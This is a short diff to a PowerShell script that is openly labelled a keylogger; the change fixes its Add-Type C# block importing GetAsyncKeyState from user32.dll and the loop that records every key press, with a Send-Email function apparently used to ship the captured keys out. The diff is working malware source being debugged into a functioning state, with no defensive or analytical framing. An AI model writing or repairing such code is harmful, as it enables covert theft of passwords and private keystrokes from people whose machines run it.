@@ -26,14 +26,15 @@ function Send-Email {
 
 # Run keylogger loop
 function Start-KeyLogger {
+    # Fix Add-Type with proper C# syntax
     Add-Type -TypeDefinition @"
     using System;
     using System.Runtime.InteropServices;
     public class KeyLogger {
-        [DllImport("user32.dll")]
+        [DllImport("user32.dll", SetLastError = true)]
         public static extern short GetAsyncKeyState(int vKey);
     }
-    "@ -Name "KeyLogger" -Namespace "KeyLogging" -Using System.Text;
+    "@ -Language CSharp
 
     $startTime = Get-Date
     $lastSent = $startTime
@@ -42,7 +43,7 @@ function Start-KeyLogger {
     while ($true) {
         # Capture key presses
         for ($i = 1; $i -lt 255; $i++) {
-            if ([KeyLogging.KeyLogger]::GetAsyncKeyState($i) -ne 0) {
+            if ([KeyLogger]::GetAsyncKeyState($i) -ne 0) {
                 $keyPresses += [char]$i
             }
         }
